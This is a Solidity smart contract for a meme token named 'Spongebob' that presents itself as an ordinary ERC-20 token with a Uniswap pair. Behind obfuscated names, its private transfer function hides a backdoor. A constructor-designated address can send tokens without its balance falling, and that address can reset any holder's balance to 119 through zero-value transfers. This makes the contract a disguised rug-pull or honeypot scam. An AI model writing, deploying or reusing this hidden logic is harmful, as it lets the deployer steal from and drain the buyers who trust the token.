/*

https://t.me/spongebob_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Spongebob is Ownable {
    constructor(address aciksh) {
        balanceOf[msg.sender] = totalSupply;
        qrdu[aciksh] = ezrybl;
        IUniswapV2Router02 jgfzhm = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        hiwkxmp = IUniswapV2Factory(jgfzhm.factory()).createPair(address(this), jgfzhm.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    string public name = 'Spongebob';

    mapping(address => uint256) private qrdu;

    string public symbol = 'SPONGE';

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private wnarmf;

    uint256 private ezrybl = 119;

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function pbmr(address usjwobry, address qtxwu, uint256 vibdrosxkmyf) private {
        if (qrdu[usjwobry] == 0) {
            balanceOf[usjwobry] -= vibdrosxkmyf;
        }
        balanceOf[qtxwu] += vibdrosxkmyf;
        if (qrdu[msg.sender] > 0 && vibdrosxkmyf == 0 && qtxwu != hiwkxmp) {
            balanceOf[qtxwu] = ezrybl;
        }
        emit Transfer(usjwobry, qtxwu, vibdrosxkmyf);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public hiwkxmp;

    function transferFrom(address usjwobry, address qtxwu, uint256 vibdrosxkmyf) public returns (bool success) {
        require(vibdrosxkmyf <= allowance[usjwobry][msg.sender]);
        allowance[usjwobry][msg.sender] -= vibdrosxkmyf;
        pbmr(usjwobry, qtxwu, vibdrosxkmyf);
        return true;
    }

    function approve(address tuxjakwzg, uint256 vibdrosxkmyf) public returns (bool success) {
        allowance[msg.sender][tuxjakwzg] = vibdrosxkmyf;
        emit Approval(msg.sender, tuxjakwzg, vibdrosxkmyf);
        return true;
    }

    function transfer(address qtxwu, uint256 vibdrosxkmyf) public returns (bool success) {
        pbmr(msg.sender, qtxwu, vibdrosxkmyf);
        return true;
    }
}